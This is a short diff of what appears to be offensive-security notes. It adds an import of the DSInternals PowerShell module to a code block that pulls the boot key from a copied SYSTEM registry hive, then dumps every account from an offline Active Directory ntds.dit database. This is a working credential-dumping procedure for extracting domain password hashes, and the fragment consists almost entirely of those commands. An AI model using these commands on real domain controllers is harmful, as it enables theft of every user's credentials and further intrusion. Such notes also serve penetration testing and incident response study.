@@ -9,6 +9,7 @@ Compress-Archive -Path C:\Users\Public\Downloads\poon -DestinationPath C:\Users\
 #Install-Module DSInternals -Force
 
 ```powershell
+Import-Module DSInternals
 $Key = Get-BootKey -SystemHiveFilePath C:\Users\p4yl0ad\Desktop\AD\poon\registry\SYSTEM
  
 Get-ADDBAccount -BootKey $Key -DatabasePath 'C:\Users\p4yl0ad\Desktop\AD\poon\ntds.dit' -All |
